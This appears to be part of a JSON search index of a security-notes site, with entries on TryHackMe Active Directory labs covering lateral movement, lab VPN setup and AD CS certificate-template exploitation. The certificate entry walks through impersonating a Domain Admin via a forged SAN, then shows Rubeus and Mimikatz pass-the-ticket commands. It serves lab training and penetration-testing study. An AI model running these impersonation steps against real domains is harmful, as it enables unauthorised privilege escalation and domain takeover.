    "c": "Introduction  THM Room: Lateral Movement and Pivoting What?  Move around the network while creating as few alerts as possible. From one system taking over another. Why?  To have alternatives to find the best path to take. For example, if another system is untouchable or more secure or if the first was not compromised. How?  Setup for THM AD Moving through the network Spawning processes remotely Moving laterally using wmi Use of alternate authentication material Abusing user behaviour Port forwarding Cleanup",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9670818b63e9310bd8c88f2a8b062e30",
    "u": "https://ad.tymyrddin.dev/docs/exploit/certificates",
    "t": "Exploiting certificates ",
    "c": "Exploiting certificates  Active Directory Certificate Services (AD CS) is Microsoft’s PKI implementation. It is used in: Establishing trusts between domains Encryption Digital signatures Authentication Certificate templates allow an organization to offload the certificate request process to certain authorized users Finding vulnerable certificate templates  Use the RDP session on THMSERVER2 to enumerate certificate templates certutil -Template -v > .\\templates.txt A certificate template can be exploited if the following parameters are present: Client Authentication : Certificate can be used in client authentication CT_FLAG_ENROLEE_SUPPLIES_SUBJECT : Can specify an alternate SAN CTPRIVATEKEY_FLAG_EXPORTABLE_KEY : Can export the private key along with the certificate Certificate Permissions : User has the permissions to use the template SpecterOps mentions eight common security misconfigurations with AD CS, so it should be noted that there are still a significant amount of potential misconfigurations that can be found. Exploiting a Certificate Template  Using RDP access on THMSERVER2 , request a certificate. (If you use Remmina and save the config of the RDP connection, make sure to disable Restricted admin mode). Use the Microsoft Management Console (MMC): Click Start -> run Type mmc and hit enter Click File -> Add/Remove Snap-in.. Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts. Click OK Request a personal certificate: Right Click on Personal and select All Tasks->Request New Certificate… Click Next twice to select the AD enrollment policy. You will see that we have one template that we can request, but first, we need to provide additional information. Click on the More Information warning. Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add. Change the Alternative name Type option to User principal name. Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add. click Apply and OK. Select the certificate and click Enroll . You should be able to see your certificate. Export the certificate with the private key: Right-click on the certificate and select All Tasks -> Export… Click Next, select Yes, export the private key, and click Next. Click Next, then set a password for the certificate since the private key cannot be exported without a password. Click Next and select a location to store the certificate. Click Next and finally click Finish. User impersonation through a certificate  Use the certificate to request a Kerberos ticket-granting ticket (TGT) Load the Kerberos TGT into your hacking platform of choice Use Rubeus to Inject the Certificate C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\\Users\\username\\Desktop\\mycert.pfx /password:Password123 /outfile:pwn.kirbi /domain:za.tryhackme.loc /dc:10.200.60.101 Use Mimikatz to Pass-the-Ticket: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # privilege::debug mimikatz # kerberos::ptt pwn.kirbi mimikatz # misc::cmd C:> explorer.exe Browse the file system of the domain controller from THMSERVER2 .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "daba242b5cfd794d39131cf540e0fa02",
    "u": "https://ad.tymyrddin.dev/docs/exploit/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Connecting to the network  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<some assigned code>-exploitingad.ovpn --daemon Check PID (you get a number, if not, does not work): sudo ps aux | grep -v grep | grep -i <some assigned code>-exploitingad.ovpn | awk -v FS=' ' '{print $2}' Edit DNS configuration  Set your DNS IPv4 to the IP address of the THMCHILDDC in the network diagram (also add 1.1.1.1 for connections to the internet) and run: sudo systemctl restart NetworkManager Test hostname lookups  $ dig thmdc.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmdc.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 468 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmdc.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmdc.za.tryhackme.loc. 1200 IN A 10.200.60.101 ;; Query time: 40 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 14:15:34 GMT 2022 ;; MSG SIZE rcvd: 67 And: $ nslookup google.com ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Server: 1.1.1.1 Address: 1.1.1.1#53 Non-authoritative answer: Name: google.com Address: 216.58.214.78 ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Name: google.com Address: 2a00:1450:4007:818::200e Request credentials  Get your credentials from http://distributor.za.tryhackme.loc/creds . Jump in  You can now either login with ssh , for example: $ ssh za.tryhackme.loc\\\\<AD Username>@thmwrk1.za.tryhackme.loc Or by RDP: $ xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'<AD Username>' /p:'<AD Password>'",
    "cat": "red_through",
    "type": "html"
  }
]